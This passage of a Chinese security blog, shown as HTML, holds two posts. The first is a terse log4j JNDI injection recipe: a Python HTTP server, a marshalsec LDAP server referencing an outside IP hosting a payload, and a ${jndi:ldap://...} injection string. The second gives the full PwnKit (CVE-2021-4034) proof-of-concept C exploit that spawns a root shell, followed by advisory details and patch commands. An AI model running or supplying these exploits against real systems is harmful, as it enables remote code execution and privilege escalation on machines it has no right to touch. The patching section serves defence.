<h1 id="0x2-使用python开启简单http服务"><a href="#0x2-使用python开启简单http服务" class="headerlink" title="0x2 使用python开启简单http服务"></a>0x2 使用python开启简单http服务</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 7002</span><br></pre></td></tr></table></figure>

<p>python3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 7002`</span><br></pre></td></tr></table></figure>

<h1 id="0x3-使用工具生成jndi服务"><a href="#0x3-使用工具生成jndi服务" class="headerlink" title="0x3 使用工具生成jndi服务"></a>0x3 使用工具生成jndi服务</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer  http://42.112.232.66:7002/#poc 7777</span><br></pre></td></tr></table></figure>
<h1 id="0x4-最后使用反序列化POC，如log4j-poc"><a href="#0x4-最后使用反序列化POC，如log4j-poc" class="headerlink" title="0x4 最后使用反序列化POC，如log4j poc"></a>0x4 最后使用反序列化POC，如log4j poc</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://42.112.232.66:7777&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-4034%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-4034%EF%BC%89/" class="post-title-link" itemprop="url">Linux本地提权漏洞（CVE-2021-4034）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:47:19 / 修改时间：09:50:26" itemprop="dateCreated datePublished" datetime="2024-09-10T09:47:19+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><a target="_blank" rel="noopener" href="https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c">参考</a></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;</span><br><span class="line"> * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</span><br><span class="line"> */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">char *shell = </span><br><span class="line">	&quot;#include &lt;stdio.h&gt;\n&quot;</span><br><span class="line">	&quot;#include &lt;stdlib.h&gt;\n&quot;</span><br><span class="line">	&quot;#include &lt;unistd.h&gt;\n\n&quot;</span><br><span class="line">	&quot;void gconv() &#123;&#125;\n&quot;</span><br><span class="line">	&quot;void gconv_init() &#123;\n&quot;</span><br><span class="line">	&quot;	setuid(0); setgid(0);\n&quot;</span><br><span class="line">	&quot;	seteuid(0); setegid(0);\n&quot;</span><br><span class="line">	&quot;	system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#x27;GCONV_PATH=.&#x27; &#x27;pwnkit&#x27;; /bin/sh\&quot;);\n&quot;</span><br><span class="line">	&quot;	exit(0);\n&quot;</span><br><span class="line">	&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	system(&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;);</span><br><span class="line">	system(&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;);</span><br><span class="line">	fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);</span><br><span class="line">	fprintf(fp, &quot;%s&quot;, shell);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);</span><br><span class="line">	char *env[] = &#123; &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL &#125;;</span><br><span class="line">	execve(&quot;/usr/bin/pkexec&quot;, (char*[])&#123;NULL&#125;, env);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>我司监测到一则polkit组件存在本地权限提升漏洞的信息，漏洞编号：CVE-2021-4034，该漏洞是由于pkexec在处理传入参数的逻辑出现问题，导致环境变量被污染，最终交由pkexec代码逻辑执行实现客户机权限提升。有普通权限用户的攻击者通过执行漏洞文件，触发越界读写，从而在目标系统上造成权限提升。</p>
<h4 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h4><p>高危</p>
<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>所有主流Linux发行版本均受影响</p>
<h4 id="安全版本"><a href="#安全版本" class="headerlink" title="安全版本"></a>安全版本</h4><h5 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h5><p>CentOS 6：polkit-0.96-11.el6_10.2</p>
<p>CentOS 7：polkit-0.112-26.el7_9.1</p>
<p>CentOS 8.0：polkit-0.115-13.el8_5.1</p>
<p>CentOS 8.2：polkit-0.115-11.el8_2.2</p>
<p>CentOS 8.4：polkit-0.115-11.el8_4.2</p>
<h5 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h5><p>Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1</p>
<p>Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1</p>
<p>Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6</p>
<p>Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2</p>
<p>Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1</p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>CentOS，可采用以下命令升级Polkit至安全版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum clean all &amp;&amp; yum makecache &amp;&amp; yum update polkit -y</span><br></pre></td></tr></table></figure>

<p>成功升级后，您可以运行以下命令查看Polkit的版本信息，检查是否为安全版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rpm -qa polkit</span><br></pre></td></tr></table></figure>

<p>Ubuntu，可采用以下命令升级Polkit至安全版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt-get updatesudo apt-get install policykit-1</span><br></pre></td></tr></table></figure>

<p>成功升级后，您可以运行以下命令查看Polkit的版本信息，检查是否为安全版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l policykit-1</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/8/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>

  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.3.0/pdfobject.min.js","integrity":"sha256-JJZNsid68vnh3/zyj0lY9BN5ynxVX/12XgOa1TlaYN0="},"url":"/lib/pdf/web/viewer.html"}</script>
  <script src="/js/third-party/tags/pdf.js"></script>




  <script src="/js/third-party/pace.js"></script>


  








</body>
</html>
